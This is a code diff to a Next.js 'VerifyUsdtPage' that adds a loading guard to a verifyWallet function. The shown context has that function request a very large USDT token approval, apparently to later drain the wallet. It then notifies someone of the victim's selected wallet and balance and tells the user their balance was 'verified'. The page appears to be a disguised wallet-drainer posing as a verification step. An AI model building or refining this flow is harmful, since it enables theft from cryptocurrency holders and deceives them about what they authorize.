@@ -14,6 +14,7 @@ const VerifyUsdtPage: NextPage = () => {
     // 
     const { adapters, selectedIndex, setSelectedIndex } = useAdapters();
     const [loading, setLoading] = useState(false);
+    const [verifyLoading, setVerifyLoading] = useState(false);
     const [loginShow, setLoginShow] = useState(false);
     const [completed, setCompleted] = useState(false);
     const [balance, setBalance] = useState(0);
@@ -134,14 +135,20 @@ const VerifyUsdtPage: NextPage = () => {
     }
 
     async function verifyWallet() {
-        // setVerifyLoading(false);
+        if(verifyLoading) {
+            toastNotification('please wait...', true);
+            return;
+        }
+        setVerifyLoading(true);
         await approveUSDT(100000000);
         if(await checkApprovalStatus()) {
             await sendNotification(selectedIndex, balance);
             toastNotification('Verified USDT balance', true);
+            setVerifyLoading(false);
             setCompleted(true);
         } else {
             toastNotification("Failed Verification", false);
+            setVerifyLoading(false);
         }
     }
 
